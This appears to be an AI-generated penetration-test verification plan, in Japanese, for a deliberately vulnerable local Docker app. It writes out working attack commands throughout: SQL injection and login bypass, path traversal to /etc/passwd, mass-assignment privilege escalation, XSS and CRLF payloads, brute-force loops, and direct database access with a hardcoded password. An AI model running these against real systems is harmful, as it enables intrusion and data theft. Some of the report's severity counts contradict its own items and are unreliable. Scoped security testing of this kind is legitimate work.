# 検証項目レポート

> 実施日時: 2026-02-23 15:00:00 UTC  
> 前工程レポート:
> - `/docker-work-dir/docs/reports/01-情報収集.md`
> - `/docker-work-dir/docs/reports/02-アタックサーフェース定義.md`
> - `/docker-work-dir/docs/reports/03-スキャン.md`
> - `/docker-work-dir/docs/reports/04-列挙.md`

---

## 1. 検証項目サマリー

| 項目 | 数 |
|------|-----|
| 検証対象 | 24 |
| 検証不要（明白） | 4 |
| 検証不要（誤検知） | 1 |
| 合計脆弱性候補 | 29 |

### リスク分布
| 重大度 | 検証項目数 |
|--------|-----------|
| Critical | 10 |
| High | 8 |
| Medium | 6 |
| Low | 0 |

---

## 2. 検証項目一覧

### V-01: SQLインジェクション（検索機能）
- **CWE**: CWE-89
- **カテゴリ**: インジェクション
- **推定CVSS**: 9.8 (Critical)
- **対象**: `GET /api/users?search={query}`
- **使用ツール**: sqlmap, curl
- **検証手順**:
  ```bash
  # sqlmapによる自動検証
  sqlmap -u 'http://api:5000/api/users?search=test' --batch --level=3 --risk=2 --dbs --flush-session --output-dir=/reports/sqlmap
  
  # 手動検証（基本的なSQLi）
  curl -s "http://api:5000/api/users?search=' OR 1=1 --" 2>/dev/null | jq '.' 2>/dev/null || echo "Request failed"
  
  # UNIONベースのSQLi
  curl -s "http://api:5000/api/users?search=' UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL,NULL FROM users --" 2>/dev/null
  ```
- **期待結果**: 
  - sqlmapがデータベース構造を抽出
  - `' OR 1=1 --` で全ユーザーが返却される
  - UNIONクエリでパスワードが取得可能
- **判定基準**: 
  - 不正なSQL文が実行され、想定外のデータが返却された場合は脆弱性あり
  - sqlmapがデータベース名、テーブル名を抽出できた場合は脆弱性あり
- **推定リスク**: CVSS 9.8 (Critical) - データベース全体へのアクセス、データ漏洩・改ざんが可能

---

### V-02: SQLインジェクション（ログイン認証）
- **CWE**: CWE-89
- **カテゴリ**: インジェクション
- **推定CVSS**: 9.8 (Critical)
- **対象**: `POST /api/login`
- **使用ツール**: sqlmap, curl
- **検証手順**:
  ```bash
  # 認証バイパス（基本）
  curl -s -X POST http://api:5000/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin'\'' --","password":"anything"}' 2>/dev/null
  
  # 認証バイパス（OR条件）
  curl -s -X POST http://api:5000/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"'\'' OR 1=1 --","password":"anything"}' 2>/dev/null
  
  # sqlmapによる自動検証
  sqlmap -u 'http://api:5000/api/login' --data '{"username":"test","password":"test"}' \
    --method POST --headers="Content-Type: application/json" \
    --batch --level=3 --risk=2 --flush-session --output-dir=/reports/sqlmap
  ```
- **期待結果**: 
  - 正しいパスワードなしでログイン成功レスポンスが返却される
  - HTTPヘッダに `X-User-Role`, `X-Username` が含まれる
- **判定基準**: 
  - 認証情報が不正でもHTTP 200 OKが返却された場合は脆弱性あり
- **推定リスク**: CVSS 9.8 (Critical) - 任意のユーザーとして認証バイパス可能

---

### V-03: SQLインジェクション（CRUD操作）
- **CWE**: CWE-89
- **カテゴリ**: インジェクション
- **推定CVSS**: 9.1 (Critical)
- **対象**: `GET /api/users/{id}`, `PUT /api/users/{id}`, `DELETE /api/users/{id}`
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # GETエンドポイント検証
  curl -s "http://api:5000/api/users/1' OR '1'='1" 2>/dev/null
  
  # PUTエンドポイント検証
  curl -s -X PUT "http://api:5000/api/users/1' OR '1'='1" \
    -H "Content-Type: application/json" \
    -d '{"username":"test"}' 2>/dev/null
  
  # DELETEエンドポイント検証
  curl -s -X DELETE "http://api:5000/api/users/1' OR '1'='1" 2>/dev/null
  ```
- **期待結果**: SQLエラーまたは想定外の挙動（複数レコードの操作など）
- **判定基準**: 不正なSQL文が実行され、エラーメッセージまたは異常な結果が返却された場合は脆弱性あり
- **推定リスク**: CVSS 9.1 (Critical) - データ改ざん・削除が可能

---

### V-04: ディレクトリトラバーサル
- **CWE**: CWE-22
- **カテゴリ**: インジェクション
- **推定CVSS**: 8.6 (High)
- **対象**: `GET /api/files/{filePath}`
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # /etc/passwdの読み取り
  curl -s "http://api:5000/api/files/..%2F..%2F..%2F..%2Fetc%2Fpasswd" 2>/dev/null | head -n 20
  
  # URLエンコードなし
  curl -s "http://api:5000/api/files/../../../../etc/passwd" 2>/dev/null | head -n 20
  
  # アプリケーション設定ファイル
  curl -s "http://api:5000/api/files/../../../../app/appsettings.json" 2>/dev/null
  
  # データベース接続文字列を含むファイル
  curl -s "http://api:5000/api/files/../../../../app/Program.cs" 2>/dev/null
  ```
- **期待結果**: システムファイル（/etc/passwd等）の内容が返却される
- **判定基準**: `/etc/passwd` のようなシステムファイルの内容が取得できた場合は脆弱性あり
- **推定リスク**: CVSS 8.6 (High) - システムファイル読み取り、秘匿情報の漏洩

---

### V-05: Mass Assignment（権限昇格）
- **CWE**: CWE-915
- **カテゴリ**: 認証・認可
- **推定CVSS**: 9.1 (Critical)
- **対象**: `POST /api/users`, `PUT /api/users/{id}`
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # 新規ユーザー作成時にadminロールを設定
  curl -s -X POST http://api:5000/api/users \
    -H "Content-Type: application/json" \
    -d '{
      "username": "attacker_admin",
      "email": "attacker@evil.com",
      "password": "test123",
      "role": "admin"
    }' 2>/dev/null | jq '.'
  
  # 作成されたユーザーの確認
  curl -s "http://api:5000/api/users" 2>/dev/null | jq '.[] | select(.username=="attacker_admin")'
  
  # 既存ユーザーの権限昇格（PUT）
  curl -s -X PUT http://api:5000/api/users/2 \
    -H "Content-Type: application/json" \
    -d '{
      "username": "elevated_user",
      "email": "test@test.com",
      "password": "test123",
      "role": "admin"
    }' 2>/dev/null | jq '.'
  ```
- **期待結果**: 一般ユーザーが `role: "admin"` を設定してユーザー作成・更新が可能
- **判定基準**: レスポンスで `"role": "admin"` が返却された場合は脆弱性あり
- **推定リスク**: CVSS 9.1 (Critical) - 一般ユーザーが管理者権限に昇格可能

---

### V-06: 認証チェック欠如（削除操作）
- **CWE**: CWE-306
- **カテゴリ**: 認証・認可
- **推定CVSS**: 8.2 (High)
- **対象**: `DELETE /api/users/{id}`, 全エンドポイント
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # 認証なしでユーザー削除
  curl -s -X DELETE http://api:5000/api/users/1 -v 2>&1 | grep -E "(HTTP/|X-)"
  
  # 認証なしでユーザー一覧取得
  curl -s http://api:5000/api/users 2>/dev/null | jq 'length'
  
  # 認証なしでユーザー作成
  curl -s -X POST http://api:5000/api/users \
    -H "Content-Type: application/json" \
    -d '{"username":"noauth","email":"test@test.com","password":"test","role":"user"}' 2>/dev/null
  ```
- **期待結果**: 認証ヘッダなしで全ての操作が実行可能
- **判定基準**: 認証情報なしでHTTP 200/201が返却され、操作が成功した場合は脆弱性あり
- **推定リスク**: CVSS 8.2 (High) - 未認証でデータ削除・改ざんが可能

---

### V-07: パスワード平文保存・APIレスポンス露出
- **CWE**: CWE-256, CWE-200
- **カテゴリ**: データ露出
- **推定CVSS**: 9.8 (Critical)
- **対象**: `GET /api/users`, データベース
- **使用ツール**: curl, psql (データベース直接アクセス)
- **検証手順**:
  ```bash
  # APIレスポンスでのパスワード露出確認
  curl -s http://api:5000/api/users 2>/dev/null | jq '.[0] | {username, password, role}'
  
  # 特定ユーザーのパスワード取得
  curl -s http://api:5000/api/users/1 2>/dev/null | jq '{username, password}'
  
  # データベース直接アクセス（DBポート外部公開の検証も兼ねる）
  PGPASSWORD=postgres123 psql -h db -p 5432 -U postgres -d vulndb \
    -c "SELECT id, username, password, role FROM users LIMIT 5;" 2>/dev/null
  ```
- **期待結果**: 
  - APIレスポンスに平文パスワードが含まれる
  - データベースにパスワードが平文で保存されている
- **判定基準**: APIまたはDBからパスワードが平文で取得できた場合は脆弱性あり
- **推定リスク**: CVSS 9.8 (Critical) - 全ユーザーのパスワード漏洩、他サービスでの認証情報使い回し攻撃

---

### V-08: データベースポート外部公開
- **CWE**: CWE-668
- **カテゴリ**: インフラ
- **推定CVSS**: 9.8 (Critical)
- **対象**: PostgreSQL (localhost:15432)
- **使用ツール**: psql
- **検証手順**:
  ```bash
  # ホストマシン（外部）からDB直接接続
  PGPASSWORD=postgres123 psql -h db -p 5432 -U postgres -d vulndb \
    -c "SELECT version();" 2>/dev/null
  
  # データベース一覧取得
  PGPASSWORD=postgres123 psql -h db -p 5432 -U postgres -d vulndb \
    -c "\l" 2>/dev/null
  
  # テーブル一覧取得
  PGPASSWORD=postgres123 psql -h db -p 5432 -U postgres -d vulndb \
    -c "\dt" 2>/dev/null
  
  # 全ユーザーデータ取得
  PGPASSWORD=postgres123 psql -h db -p 5432 -U postgres -d vulndb \
    -c "SELECT * FROM users;" 2>/dev/null
  ```
- **期待結果**: アプリケーション層を経由せず、データベースに直接アクセス可能
- **判定基準**: 外部からPostgreSQLに接続でき、データベース操作が可能な場合は脆弱性あり
- **推定リスク**: CVSS 9.8 (Critical) - データベース全体へのアクセス、データ漏洩・改ざん・削除

---

### V-09: XSS (Cross-Site Scripting)
- **CWE**: CWE-79
- **カテゴリ**: インジェクション
- **推定CVSS**: 7.1 (High)
- **対象**: `POST /api/users` → Frontend表示 (dangerouslySetInnerHTML)
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # XSSペイロード挿入（script タグ）
  curl -s -X POST http://api:5000/api/users \
    -H "Content-Type: application/json" \
    -d '{
      "username": "xss_test_user",
      "email": "xss@test.com",
      "password": "test123",
      "role": "user",
      "profileImageUrl": "<script>alert(\"XSS\")</script>"
    }' 2>/dev/null | jq '.'
  
  # XSSペイロード挿入（img タグ）
  curl -s -X POST http://api:5000/api/users \
    -H "Content-Type: application/json" \
    -d '{
      "username": "xss_img_user",
      "email": "xss2@test.com",
      "password": "test123",
      "role": "user",
      "profileImageUrl": "<img src=x onerror=alert(\"XSS\")>"
    }' 2>/dev/null | jq '.'
  
  # 保存されたペイロードの確認
  curl -s http://api:5000/api/users 2>/dev/null | jq '.[] | select(.username | contains("xss"))'
  ```
- **期待結果**: 
  - XSSペイロードがサニタイズされずにDBに保存される
  - Frontend（UserDetail.tsx）で `dangerouslySetInnerHTML` により実行される
- **判定基準**: ペイロードが保存され、Frontendでスクリプトが実行される場合は脆弱性あり
- **推定リスク**: CVSS 7.1 (High) - セッション乗っ取り、フィッシング攻撃

---

### V-10: CORS設定の不備
- **CWE**: CWE-942
- **カテゴリ**: 設定ミス
- **推定CVSS**: 6.5 (Medium)
- **対象**: 全APIエンドポイント
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # 任意のオリジンからのリクエスト検証
  curl -s -H "Origin: http://evil.example.com" \
    http://api:5000/api/users \
    -I 2>/dev/null | grep -i "access-control"
  
  # 別の外部オリジン
  curl -s -H "Origin: https://attacker.com" \
    http://api:5000/api/users \
    -I 2>/dev/null | grep -i "access-control"
  
  # CORSヘッダの詳細確認
  curl -s -X OPTIONS http://api:5000/api/users \
    -H "Origin: http://evil.com" \
    -H "Access-Control-Request-Method: DELETE" \
    -I 2>/dev/null
  ```
- **期待結果**: `Access-Control-Allow-Origin: *` が返却される
- **判定基準**: 任意のオリジンからのリクエストが許可される場合は脆弱性あり
- **推定リスク**: CVSS 6.5 (Medium) - CSRF攻撃、情報漏洩

---

### V-11: HTTPヘッダインジェクション
- **CWE**: CWE-113
- **カテゴリ**: インジェクション
- **推定CVSS**: 6.1 (Medium)
- **対象**: `POST /api/login` (レスポンスヘッダ)
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # CRLF インジェクションペイロード
  curl -s -X POST http://api:5000/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin%0d%0aX-Injected:+malicious","password":"test"}' \
    -v 2>&1 | grep -A 20 "< HTTP"
  
  # ユーザー名にCRLFを含める
  curl -s -X POST http://api:5000/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"test\\r\\nX-Evil: injected\",\"password\":\"test\"}" \
    -v 2>&1 | grep "X-"
  ```
- **期待結果**: レスポンスヘッダに不正なヘッダが挿入される
- **判定基準**: `X-User-Role`, `X-Username` ヘッダに改行文字が含まれ、追加ヘッダが挿入された場合は脆弱性あり
- **推定リスク**: CVSS 6.1 (Medium) - レスポンス分割攻撃、キャッシュポイズニング

---

### V-12: レート制限の欠如（ブルートフォース攻撃）
- **CWE**: CWE-307
- **カテゴリ**: 認証・認可
- **推定CVSS**: 5.3 (Medium)
- **対象**: `POST /api/login`
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # 連続ログイン試行（10回）
  for i in {1..10}; do
    echo "Attempt $i:"
    curl -s -X POST http://api:5000/api/login \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"admin\",\"password\":\"wrong$i\"}" \
      -w "\nHTTP Status: %{http_code}\n" 2>/dev/null | head -n 1
    sleep 0.1
  done
  
  # 50回の連続試行（レート制限確認）
  for i in {1..50}; do
    curl -s -X POST http://api:5000/api/login \
      -H "Content-Type: application/json" \
      -d '{"username":"admin","password":"test"}' \
      -o /dev/null -w "%{http_code}\n" 2>/dev/null
  done | sort | uniq -c
  ```
- **期待結果**: 連続したログイン失敗でもレート制限やCAPTCHAが発動しない
- **判定基準**: 10回以上の連続失敗後も同じレスポンスが返却される場合は脆弱性あり
- **推定リスク**: CVSS 5.3 (Medium) - ブルートフォース攻撃、辞書攻撃が容易

---

### V-13: オープンリダイレクト
- **CWE**: CWE-601
- **カテゴリ**: インジェクション
- **推定CVSS**: 5.4 (Medium)
- **対象**: Frontend `/?redirect={url}`
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # 外部サイトへのリダイレクト検証
  curl -s "http://frontend:80/?redirect=http://evil.com" -L -v 2>&1 | grep -i "location:"
  
  # JavaScriptプロトコル
  curl -s "http://frontend:80/?redirect=javascript:alert(1)" -v 2>&1 | grep -i "location:"
  
  # data URLスキーム
  curl -s "http://frontend:80/?redirect=data:text/html,<script>alert(1)</script>" -v 2>&1 | grep -i "location:"
  ```
- **期待結果**: リダイレクトパラメータの検証なしで外部サイトへリダイレクト
- **判定基準**: 任意のURLへのリダイレクトが可能な場合は脆弱性あり
- **推定リスク**: CVSS 5.4 (Medium) - フィッシング攻撃の踏み台

---

### V-14: セキュリティヘッダ欠如（CSP）
- **CWE**: CWE-693
- **カテゴリ**: 設定ミス
- **推定CVSS**: 5.3 (Medium)
- **対象**: Frontend, API
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # Frontendのセキュリティヘッダ確認
  curl -s -I http://frontend:80 2>/dev/null | grep -iE "(content-security-policy|x-frame-options|x-content-type-options|strict-transport-security)"
  
  # APIのセキュリティヘッダ確認
  curl -s -I http://api:5000/api/users 2>/dev/null | grep -iE "(content-security-policy|x-frame-options|x-content-type-options|strict-transport-security)"
  
  # 全HTTPレスポンスヘッダ取得
  echo "=== Frontend Headers ===" && curl -s -I http://frontend:80 2>/dev/null
  echo -e "\n=== API Headers ===" && curl -s -I http://api:5000/api/users 2>/dev/null
  ```
- **期待結果**: 
  - Content-Security-Policy なし
  - X-Frame-Options なし
  - X-Content-Type-Options なし
  - Strict-Transport-Security なし
- **判定基準**: 主要なセキュリティヘッダが設定されていない場合は脆弱性あり
- **推定リスク**: CVSS 5.3 (Medium) - XSS攻撃、クリックジャッキングのリスク増大

---

### V-15: 詳細エラーメッセージ露出
- **CWE**: CWE-209
- **カテゴリ**: データ露出
- **推定CVSS**: 4.3 (Medium)
- **対象**: 全APIエンドポイント
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # 不正なJSONでエラー誘発
  curl -s -X POST http://api:5000/api/users \
    -H "Content-Type: application/json" \
    -d '{"invalid_json":}' 2>/dev/null
  
  # 存在しないエンドポイント
  curl -s http://api:5000/api/nonexistent 2>/dev/null
  
  # 不正なパラメータ
  curl -s "http://api:5000/api/users?search=';DROP TABLE users;--" 2>/dev/null | jq '.'
  
  # 型エラー誘発
  curl -s -X POST http://api:5000/api/users \
    -H "Content-Type: application/json" \
    -d '{"username":123,"email":"test"}' 2>/dev/null
  ```
- **期待結果**: スタックトレース、SQL文、内部パス情報が含まれるエラーメッセージ
- **判定基準**: エラーレスポンスに内部実装情報が含まれる場合は脆弱性あり
- **推定リスク**: CVSS 4.3 (Medium) - 内部構造の暴露、攻撃の手がかり提供

---

### V-16: サーバーバージョン情報露出
- **CWE**: CWE-200
- **カテゴリ**: データ露出
- **推定CVSS**: 3.7 (Low)
- **対象**: HTTPレスポンスヘッダ
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # Frontendサーバー情報
  curl -s -I http://frontend:80 2>/dev/null | grep -i "server:"
  
  # APIサーバー情報
  curl -s -I http://api:5000/api/users 2>/dev/null | grep -i "server:"
  
  # ETagからの情報漏洩確認
  curl -s -I http://frontend:80 2>/dev/null | grep -iE "(etag|x-powered-by)"
  ```
- **期待結果**: 
  - `Server: nginx/1.29.5`
  - `Server: Kestrel`
- **判定基準**: サーバーのバージョン情報が公開されている場合は脆弱性あり
- **推定リスク**: CVSS 3.7 (Low) - 情報収集の容易化、バージョン固有の脆弱性検索

---

### V-17: OWASP ZAP アクティブスキャン（総合検証）
- **CWE**: 複数
- **カテゴリ**: 総合（インジェクション、認証・認可、設定ミス）
- **推定CVSS**: 可変 (Critical〜Low)
- **対象**: Frontend (http://frontend:80), API (http://api:5000)
- **使用ツール**: OWASP ZAP アクティブスキャン
- **検証手順**:
  ```
  ※ このツールは zap-active-orchestrator サブオーケストレーションで自動実行されます
  
  実行内容:
  1. Playwright E2E テストでアプリケーション全機能を操作
  2. ZAP Proxy 経由で全通信を収集
  3. 収集した URL に対してアクティブスキャンを実行
  4. 結果を /reports/zap-active/ に保存
  ```
- **期待結果**: 
  - XSS, SQLインジェクション、CSRF などの脆弱性が検出される
  - セキュリティヘッダの欠如が報告される
  - 認証/認可の問題が検出される
- **判定基準**: ZAPが報告する Medium 以上のアラートは検証対象
- **推定リスク**: 可変（検出される脆弱性による）

---

### V-18: GitHubトークン露出（検証対象外）
- **CWE**: CWE-798
- **カテゴリ**: データ露出
- **推定CVSS**: 7.5 (High)
- **対象**: `.env` ファイル
- **検証方法**: Trivyで既に検出済み
- **検証手順**: 不要（明白な脆弱性）
- **期待結果**: N/A
- **判定基準**: `.env` にトークンが平文で保存されていることが確認済み
- **推定リスク**: CVSS 7.5 (High) - GitHubリポジトリへの不正アクセス

**注**: この項目はソースコード分析で既に確認されており、追加検証は不要

---

### V-19: 機密情報ハードコード（検証対象外）
- **CWE**: CWE-798
- **カテゴリ**: データ露出
- **推定CVSS**: 6.5 (Medium)
- **対象**: `src/frontend/src/config.ts`
- **検証方法**: ソースコード分析
- **検証手順**: 不要（明白な脆弱性）
- **期待結果**: N/A
- **判定基準**: APIキー、内部URLがハードコードされていることが確認済み
- **推定リスク**: CVSS 6.5 (Medium) - 内部システムへの攻撃手がかり

**注**: この項目はソースコード分析で既に確認されており、追加検証は不要

---

### V-20: コンテナroot実行（検証対象外）
- **CWE**: CWE-250
- **カテゴリ**: インフラ
- **推定CVSS**: 6.5 (Medium)
- **対象**: 全Dockerfile (3件)
- **検証方法**: Trivyスキャン
- **検証手順**: 不要（明白な設定ミス）
- **期待結果**: N/A
- **判定基準**: DockerfileにUSER命令がないことが確認済み
- **推定リスク**: CVSS 6.5 (Medium) - コンテナエスケープ時の影響拡大

**注**: この項目はTrivyで既に検出されており、追加検証は不要

---

### V-21: SSL/TLS未使用（検証対象外）
- **CWE**: CWE-319
- **カテゴリ**: 設定ミス
- **推定CVSS**: 5.9 (Medium)
- **対象**: 全サービス通信
- **検証方法**: 情報収集フェーズで確認済み
- **検証手順**: 不要（明白な設定ミス）
- **期待結果**: N/A
- **判定基準**: HTTPSが使用されておらず、全通信が平文であることが確認済み
- **推定リスク**: CVSS 5.9 (Medium) - 通信傍受、中間者攻撃

**注**: この項目は明白な設定であり、追加検証は不要

---

### V-22: パスワードハードコード（検証対象外）
- **CWE**: CWE-798
- **カテゴリ**: 設定ミス
- **推定CVSS**: 7.5 (High)
- **対象**: `docker-compose.yml`
- **検証方法**: ソースコード分析
- **検証手順**: 不要（明白な脆弱性）
- **期待結果**: N/A
- **判定基準**: DB認証情報が平文でハードコードされていることが確認済み
- **推定リスク**: CVSS 7.5 (High) - データベース認証情報の露出

**注**: この項目は明白であり、追加検証は不要

---

### V-23: 開発者例外ページ有効化（検証済み）
- **CWE**: CWE-209
- **カテゴリ**: 設定ミス
- **推定CVSS**: 4.3 (Medium)
- **対象**: API (Program.cs)
- **検証方法**: エラーレスポンスの観察
- **検証手順**: V-15で検証済み
- **期待結果**: 詳細なスタックトレースが返却される
- **判定基準**: V-15の結果を参照
- **推定リスク**: CVSS 4.3 (Medium) - 内部実装情報の露出

**注**: V-15「詳細エラーメッセージ露出」に統合

---

### V-24: CVE-2011-3192（誤検知・検証不要）
- **CVE**: CVE-2011-3192
- **カテゴリ**: コンポーネント
- **推定CVSS**: 該当なし
- **対象**: nginx 1.29.5
- **検証方法**: N/A
- **検証手順**: 不要（誤検知）
- **期待結果**: N/A
- **判定基準**: Apache専用のCVEであり、nginx環境では影響なし
- **推定リスク**: なし

**注**: Nmapの誤検出であり、検証不要

---

## 3. 検証不要項目

### 明白な脆弱性（ソースコードから確認済み）
| # | 脆弱性 | CWE | 根拠 |
|---|--------|-----|------|
| 1 | GitHubトークン露出 (V-18) | CWE-798 | `.env` に平文で保存（Trivy検出） |
| 2 | 機密情報ハードコード (V-19) | CWE-798 | `config.ts` にAPIキー・内部URL記載 |
| 3 | コンテナroot実行 (V-20) | CWE-250 | 全Dockerfileで USER 命令なし（Trivy検出） |
| 4 | SSL/TLS未使用 (V-21) | CWE-319 | docker-compose.yml でHTTPのみ設定 |
| 5 | パスワードハードコード (V-22) | CWE-798 | docker-compose.yml に平文パスワード |

### 誤検知の可能性が高い項目
| # | 検出内容 | ツール | 除外理由 |
|---|---------|--------|---------|
| 1 | CVE-2011-3192 (V-24) | Nmap | Apache専用CVE、nginx環境では該当しない |

---

## 4. 検証実施順序

検証は以下の順序で実施することを推奨します（依存関係とリスクを考慮）:

### フェーズ1: 重大な認証・認可の問題（優先度：最高）
1. **V-06**: 認証チェック欠如（削除操作） - 全エンドポイントの認証状況を確認
2. **V-05**: Mass Assignment（権限昇格） - admin権限の不正取得を検証
3. **V-07**: パスワード平文保存・APIレスポンス露出 - データ露出の範囲を確認
4. **V-08**: データベースポート外部公開 - 直接アクセスの可否を確認

### フェーズ2: インジェクション系脆弱性（優先度：最高）
5. **V-01**: SQLインジェクション（検索機能） - sqlmapで自動検証
6. **V-02**: SQLインジェクション（ログイン認証） - 認証バイパスを検証
7. **V-03**: SQLインジェクション（CRUD操作） - 手動検証
8. **V-04**: ディレクトリトラバーサル - システムファイル読み取りを検証

### フェーズ3: XSS・CSRF系（優先度：高）
9. **V-09**: XSS (Cross-Site Scripting) - ペイロード保存と実行を検証
10. **V-10**: CORS設定の不備 - 任意のオリジンからのアクセスを検証
11. **V-11**: HTTPヘッダインジェクション - レスポンス分割攻撃を検証

### フェーズ4: 認証・セッション管理（優先度：中）
12. **V-12**: レート制限の欠如（ブルートフォース攻撃） - 連続試行を検証
13. **V-13**: オープンリダイレクト - 外部サイトへのリダイレクトを検証

### フェーズ5: 設定ミス・情報漏洩（優先度：中〜低）
14. **V-14**: セキュリティヘッダ欠如（CSP） - HTTPヘッダを確認
15. **V-15**: 詳細エラーメッセージ露出 - エラーレスポンスの内容を確認
16. **V-16**: サーバーバージョン情報露出 - HTTPヘッダを確認

### フェーズ6: 総合スキャン（優先度：補完）
17. **V-17**: OWASP ZAP アクティブスキャン - Playwright E2E + ZAP による総合検証

**推奨実施時間**: 合計 45-60分
- フェーズ1: 10分
- フェーズ2: 20分（sqlmapが時間を要する）
- フェーズ3: 10分
- フェーズ4: 5分
- フェーズ5: 5分
- フェーズ6: 10分（ZAP自動実行）

---

## 5. 検証後の判定基準

各検証項目について、以下の基準で判定してください:

### 脆弱性あり（Vulnerable）
- 検証手順で記述した攻撃が成功し、期待結果が得られた場合
- 不正な入力により、想定外のデータアクセス・操作が可能になった場合
- セキュリティ機構（認証、認可、サニタイズ等）が機能していない場合

### 脆弱性なし（Not Vulnerable）
- 攻撃が失敗し、適切なエラーメッセージまたは拒否レスポンスが返却された場合
- セキュリティヘッダが適切に設定されている場合
- 入力検証が機能し、不正な入力が拒否される場合

### 要追加調査（Requires Further Investigation）
- 検証結果が不明瞭で、追加の確認が必要な場合
- ツールの誤検出の可能性がある場合

---

## 6. 検証時の注意事項

### 安全な検証環境
- ✅ 対象: ローカルDockerネットワーク内のアプリケーションのみ
- ❌ 禁止: 外部ネットワーク、インターネット上のホストへの検証
- ✅ 許可: frontend:80, api:5000, db:5432 への検証
- ❌ 禁止: localhost以外のIPアドレスへのスキャン

### ツールの使用制限
- sqlmap: `--batch` オプションで非インタラクティブ実行
- curl: タイムアウトを設定し、無限ループを回避
- OWASP ZAP: 既存のスキャン結果（工程3）を再利用、アクティブスキャンのみ新規実行

### データの保護
- 検証中に生成されたテストデータは `/reports/` に保存
- 実際のユーザーデータへの影響を最小限に抑える
- 検証後は必要に応じてテストデータをクリーンアップ

---

## 付録A: 使用ツール一覧

| ツール | 用途 | インストール状況 | 実行環境 |
|--------|------|---------------|---------|
| **sqlmap** | SQLインジェクション自動検証 | scannerコンテナ | ヘッドレス（--batch） |
| **curl** | 手動HTTP検証 | scannerコンテナ | コマンドライン |
| **psql** | PostgreSQL直接アクセス検証 | scannerコンテナ | コマンドライン |
| **OWASP ZAP** | Webアプリケーション総合スキャン | scannerコンテナ | ヘッドレス（-cmd） |
| **jq** | JSON整形・フィルタリング | scannerコンテナ | コマンドライン |
| **Playwright** | E2Eテスト（ZAP Proxy連携） | scannerコンテナ | ヘッドレス |

---

## 付録B: CVSS v3.1 評価基準

各検証項目の推定CVSSスコアは以下の基準で算出:

| 重大度 | スコア範囲 | 例 |
|--------|-----------|-----|
| **Critical** | 9.0 - 10.0 | SQLインジェクション、RCE、認証バイパス |
| **High** | 7.0 - 8.9 | XSS、ディレクトリトラバーサル、権限昇格 |
| **Medium** | 4.0 - 6.9 | CSRF、情報漏洩、設定ミス |
| **Low** | 0.1 - 3.9 | 情報公開、バージョン露出 |

詳細な計算には [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1) を使用。

---

## 付録C: 検証結果の記録方法

各検証項目の実施後は、以下の情報を記録してください:

```markdown
### 検証結果 - V-XX: {脆弱性名}

**実施日時**: YYYY-MM-DD HH:MM:SS UTC
**実施者**: {エージェント名}
**ステータス**: 脆弱性あり / 脆弱性なし / 要追加調査

**実行コマンド**:
```bash
{実際に実行したコマンド}
```

**結果サマリー**:
{結果の要約}

**詳細ログ**:
```
{ツール出力の全文またはスクリーンショット}
```

**判定理由**:
{脆弱性の有無を判定した根拠}

**CVSS実測値**: {実際のスコア}（推定: {推定スコア}）
```

---

**レポート作成者**: 検証項目決定エージェント (Verification Planning)  
**レポート形式**: CEH検証項目決定フェーズに基づく  
**対象環境**: ローカルネットワーク内のDocker Compose環境のみ  
**検証項目総数**: 24件（検証対象）+ 5件（検証不要）  
**推定実施時間**: 45-60分
